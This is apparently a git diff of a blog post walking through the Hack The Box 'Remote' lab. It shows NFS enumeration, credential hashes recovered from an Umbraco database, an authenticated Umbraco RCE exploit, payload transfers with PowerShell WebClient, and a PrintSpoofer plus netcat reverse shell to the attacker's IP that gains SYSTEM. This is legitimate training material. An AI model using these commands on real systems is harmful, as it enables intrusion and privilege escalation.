@@ -27,8 +27,7 @@ All kinds of fun stuff with Remote.
 
 Get a list of the available port with nmap.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.180            
 [sudo] password for kali: 
@@ -108,14 +107,17 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 80.38 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Run the full nmap to make sure there are no pesky hidden services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.180              
 [sudo] password for kali: 
@@ -142,14 +144,17 @@ PORT      STATE SERVICE
 49680/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 17.49 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapfull %}
 
 <br />
 Try logging into FTP with the anonymous account and get the directory listing.
 
-{% raw %}
-```sh
+{% capture ftpanon %}
 ┌──(kali㉿kali)-[~]
 └─$ ftp 10.10.10.180                                                                                                      
 Connected to 10.10.10.180.
@@ -169,14 +174,17 @@ ftp> dir
 226 Transfer complete.
 ftp> pwd
 Remote directory: /
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=ftpanon %}
 
 <br />
 Run all of the nmap script for nfs on port 111.
 
-{% raw %}
-```sh
+{% capture nmapnfs %}
 ┌──(kali㉿kali)-[~]
 └─$  nmap --script=*nfs* -p 111 10.10.10.180                 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 10:50 AEDT
@@ -206,14 +214,17 @@ PORT    STATE SERVICE
 |_  /site_backups 
 
 Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapnfs %}
 
 <br />
 Mount the nfs site_backups share to a created site_backups folder.
 
-{% raw %}
-```sh
+{% capture mountnsf %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ sudo mount -t nfs 10.10.10.180:/site_backups site_backups 
 [sudo] password for kali: 
@@ -224,17 +235,19 @@ Mount the nfs site_backups share to a created site_backups folder.
 ┌──(kali㉿kali)-[~/Documents/htb/remote/site_backups]
 └─$ ls
 App_Browsers  App_Data  App_Plugins  Config  Global.asax  Media  Umbraco  Umbraco_Client  Views  Web.config  aspnet_client  bin  css  default.aspx  scripts
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=mountnsf %}
 
 <br />
 Review the website and notice the Umbraco login.
 
-{% raw %}
-```sh
-http://10.10.10.180/umbraco/#/login
-```
-{% endraw %}
+<div class="info-box">
+  http://10.10.10.180/umbraco/#/login
+</div>
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid loading="eager" path="/assets/img/remote/loginpage.png" title="Check the Login Page" class="img-fluid rounded z-depth-1" %}
@@ -244,8 +257,7 @@ http://10.10.10.180/umbraco/#/login
 <br />
 In the nfs share, look for the connection string in the Web.config file.  Notice the umbraco.sdf.
 
-{% raw %}
-```xml
+{% capture webconfig %}
 <?xml version="1.0" encoding="utf-8"?>
 <configuration>
 
@@ -260,14 +272,14 @@ In the nfs share, look for the connection string in the Web.config file.  Notice
     <snip>
 
 </configuration>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include codebox.html title="Web.config" content=webconfig %}
 
 <br />
 Run strings against the umbraco.sdf file.
 
-{% raw %}
-```sh
+{% capture stringsumbraco %}
 ┌──(kali㉿kali)-[~/…/htb/remote/site_backups/App_Data]
 └─$ strings Umbraco.sdf                                      
 Administratoradmindefaulten-US
@@ -280,8 +292,12 @@ ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpn
 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=stringsumbraco %}
 
 <br />
 Notice the SHA1 hash value.
@@ -331,8 +347,7 @@ Click the '?' icon to open a side-panel and get the Umbraco version.
 <br />
 Run searchsploit for the Umbraco verion.
 
-{% raw %}
-```sh
+{% capture searchsploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ searchsploit umbraco 7.12.4                                                           
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -342,29 +357,39 @@ Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                      
 Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                                                                | aspx/webapps/49488.py
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=searchsploit %}
 
 <br />
 Transfer the python script to the local working folder.
 
-{% raw %}
-```sh
+{% capture copyexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ cp $(locate 49488.py) .
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=copyexploit %}
 
 <br />
 Run the exploit and run whoami to test command executions.
 
-{% raw %}
-```sh
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ python3 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
 iis apppool\defaultapppool
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runexploit %}
 
 <br />
 Use the Revshells to get a powershell reverse tcp one-liner.
@@ -378,24 +403,34 @@ Use the Revshells to get a powershell reverse tcp one-liner.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchfoothold %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ sudo nc -nlvp 443                                        
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.180] 49805
+{% endcapture %}
+
+{% capture catchpowershell %}
 whoami
 iis apppool\defaultapppool
 PS C:\windows\system32\inetsrv> 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchfoothold %}
+
+{% include terminal.html
+   language="powershell"
+   title="PowerShell"
+   content=catchpowershell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 PS C:\Users\Public\Desktop> cat user.txt
 <redacted>
 PS C:\Users\Public\Desktop> ipconfig
@@ -412,14 +447,17 @@ Ethernet adapter Ethernet0 2:
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6def%12
                                        10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="powershell"
+   title="PowerShell"
+   content=userflag %}
 
 <br />
 Run the systeminfo to get useful nuggets like the OS and architecture.
 
-{% raw %}
-```bash
+{% capture sysinfo %}
 PS C:\Users\Public\Desktop> systeminfo
 
 Host Name:                 REMOTE
@@ -438,14 +476,17 @@ System Model:              VMware7,1
 System Type:               x64-based PC
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="powershell"
+   title="PowerShell"
+   content=sysinfo %}
 
 <br />
 Run whoami /priv to get the privileges.
 
-{% raw %}
-```bash
+{% capture getprivs %}
 PS C:\Users\Public\Desktop> whoami /priv
 
 PRIVILEGES INFORMATION
@@ -464,9 +505,12 @@ PS C:\Users\Public\Desktop> 0
                                  [02]: fe80::43d:2e9:512f:af70
                                  [03]: dead:beef::43d:2e9:512f:af70
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
-0
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="powershell"
+   title="PowerShell"
+   content=getprivs %}
 
 <br />
 Lookup the hacktricks article on SeImpersonate abuse.
@@ -485,8 +529,7 @@ https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escala
 <br />
 Download the PrintSpoofer executable.
 
-{% raw %}
-```bash
+{% capture downloadspoofer %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe                                                
 --2025-01-27 02:29:13--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
@@ -504,87 +547,116 @@ Saving to: ‘PrintSpoofer64.exe’
 PrintSpoofer64.exe                                         100%[========================================================================================================================================>]  26.50K  --.-KB/s    in 0.006s  
 
 2025-01-27 02:29:14 (4.65 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadspoofer %}
 
 <br />
 Start a webserver to serve the executable.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Use Powershell to transfer the exploit to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferspoofer %}
 PS C:\Windows\Temp> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.12:8000/PrintSpoofer64.exe", "C:\Windows\Temp\PrintSpoofer64.exe")
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="powershell"
+   title="PowerShell"
+   content=transferspoofer %}
 
 <br />
 Copy the nc.exe into the working folder.  Then, use Powershell to transfer it to the local machine.
 
-{% raw %}
-```bash
+{% capture transfernc %}
 PS C:\Windows\Temp> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.12:8000/nc.exe", "C:\Windows\Temp\nc.exe")
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="powershell"
+   title="PowerShell"
+   content=transfernc %}
 
 <br />
 Start a second listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ nc -nlvp 4444                                            
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Execute the PrintSpoofer executable and use the netcat executable to create a reverse shell with the listener that was just started.
 
-{% raw %}
-```bash
+{% capture runprintspoofer %}
 PS C:\Windows\Temp> C:\Windows\Temp\PrintSpoofer64.exe -c "c:\Windows\Temp\nc.exe 10.10.16.12 4444 -e cmd"
 [+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
 [+] CreateProcessAsUser() OK
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="powershell"
+   title="PowerShell"
+   content=runprintspoofer %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchrootshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/remote]
 └─$ nc -nlvp 4444                                            
 listening on [any] 4444 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.180] 49817
+{% endcapture %}
+
+{% capture checksystem %}
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32>whoami
 whoami
 nt authority\system
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchrootshell %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=checksystem %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
-2f0ff290987192dc848b29e231f4cc73
+<redacted>
 
 C:\Users\Administrator\Desktop>ipconfig
 ipconfig
@@ -601,8 +673,12 @@ Ethernet adapter Ethernet0 2:
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6def%12
                                        10.10.10.2
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=rootflag %}
 
 <br />
 With that, we bring Remote to an end.
